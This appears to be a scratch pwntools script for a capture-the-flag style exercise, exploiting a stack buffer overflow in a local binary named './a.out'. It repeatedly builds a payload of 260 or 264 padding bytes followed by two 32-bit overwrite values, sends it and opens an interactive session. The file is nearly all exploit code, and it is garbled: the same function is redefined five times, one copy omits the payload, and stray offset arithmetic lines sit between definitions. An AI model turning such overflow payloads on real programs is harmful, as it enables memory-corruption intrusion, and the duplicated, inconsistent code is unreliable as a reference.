# coding: utf-8
from pwn import*
def chall01():
    p = process("./a.out")
    p.recv()
    payload = (b"a"*260 + p32(0x1337) + p32(0x69696969))
    p.sendline()
    p.interactive()
    p.close()
     
def chall01():
    p = process("./a.out")
    p.recv()
    payload = (b"a"*260 + p32(0x1337) + p32(0x69696969))
    p.sendline(payload)
    p.interactive()
    p.close()
     
def chall01():
    p = process("./a.out")
    p.recv()
    payload = (b"a"*260 + p32(0x1337) + p32(0x69696969))
    p.sendline(payload)
    p.interactive()
    p.close()
     
def chall01():
    p = process("./a.out")
    p.recv()
    payload = (b"a"*260 + p32(0x1337) + p32(0x69696969))
    p.sendline(payload)
    p.interactive()
    p.close()
     
chall01()
0x110 - 0x8
0x110
def chall01():
    p = process("./a.out")
    p.recv()
    payload = (b"a"*264 + p32(0x1337) + p32(0x69696969))
    p.sendline(payload)
    p.interactive()
    p.close()
     
chall01()
chall01()
